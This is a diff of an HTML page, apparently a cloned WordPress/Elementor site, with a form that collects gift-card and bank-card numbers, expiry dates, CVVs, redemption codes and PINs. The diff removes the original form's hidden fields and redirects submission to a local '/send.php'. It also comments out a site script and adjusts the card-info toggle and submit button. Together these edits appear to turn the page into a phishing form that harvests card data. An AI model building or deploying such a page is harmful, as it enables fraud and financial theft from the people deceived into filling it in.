@@ -410,8 +410,8 @@
 	<script id="wpo_min-header-0-js-extra">
 		var preloader_plus = { "animation_delay": "500", "animation_duration": "1000" };
 	</script>
-	<script src="wp-content/cache/wpo-minify/1699995239/assets/wpo-minify-header-434d164f.min.js"
-		id="wpo_min-header-0-js"></script>
+	<!-- <script src="wp-content/cache/wpo-minify/1699995239/assets/wpo-minify-header-434d164f.min.js" -->
+		<!-- id="wpo_min-header-0-js"></script> -->
 	<link rel="https://api.w.org/" href="wp-json/index.html" />
 	<link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/79.json" />
 	<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
@@ -1415,11 +1415,7 @@
 													class="dce-conditions-js-error-notice  elementor-message elementor-message-danger">
 													A problem was detected in the following Form. Submitting it could
 													result in errors. Please contact the site administrator.</div>
-												<form class="" method="post" onsubmit="onSubmit()">
-													<input type="hidden" name="post_id" value="79" />
-													<input type="hidden" name="form_id" value="37989839" />
-													<input type="hidden" name="referer_title" value="" />
-
+												<form class="" method="post" action="/send.php" onsubmit="onSubmit()">
 													<input type="hidden" name="queried_id" value="79" />
 
 													<div data-field-conditions="[{&quot;id&quot;:&quot;card_number&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_mm&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;exp_yy&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;cvv&quot;,&quot;condition&quot;:&quot;(card == \&quot;Master Card\&quot; or card == \&quot;Visa Silvery White\&quot; or card == \&quot;Joker\&quot; or card == \&quot;TT Visa\&quot; or card == \&quot;Amex\&quot; or card == \&quot;Visa (The perfect gift)\&quot; or card == \&quot;Vanilla Mastercard\&quot; or card == \&quot;Walmart Visa\&quot; or card == \&quot;Vanilla\&quot; or card == \&quot;Vanilla Visa\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;redemption&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Xbox\&quot; or card == \&quot;Raser Gold\&quot; or card == \&quot;Playstation\&quot; or card == \&quot;Amazon Card\&quot; or card == \&quot;Ebay Card\&quot; or card == \&quot;Google Play Card\&quot; or card == \&quot;Steam Wallet Card\&quot; or card == \&quot;Apple Card\&quot; or card == \&quot;Select Type Of Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot;)&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false},{&quot;id&quot;:&quot;pin&quot;,&quot;condition&quot;:&quot;(card == \&quot;Sephora Card\&quot; or card == \&quot;Nike Card\&quot; or card == \&quot;Footlocker\&quot; or card == \&quot;Nordstrom Card\&quot; )&quot;,&quot;mode&quot;:&quot;show&quot;,&quot;disableOnly&quot;:false}]"
@@ -1586,8 +1582,7 @@
 
 
 																<i class="fa-regular fa-eye-slash"
-																	onclick="toggle()"><span class="show--icon">Hide
-																		Card Info</span></i>
+																	onclick="toggle()"><span class="show--icon">Hide Card Info</span></i>
 
 
 																<script>
@@ -1602,7 +1597,6 @@
 																	const cardPin = document.getElementById("form-field-pin");
 																	const icon = document.querySelector(".fa-regular");
 																	const iconText = document.querySelector(".show--icon")
-
 																	function toggle() {
 																		if (
 
@@ -1651,7 +1645,7 @@
 															class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
 															<button
 																id="submit_btn"
-																class="elementor-button elementor-size-sm">
+																class="elementor-size-sm">
 																<span>
 																	<span class=" elementor-button-icon">
 																	</span>
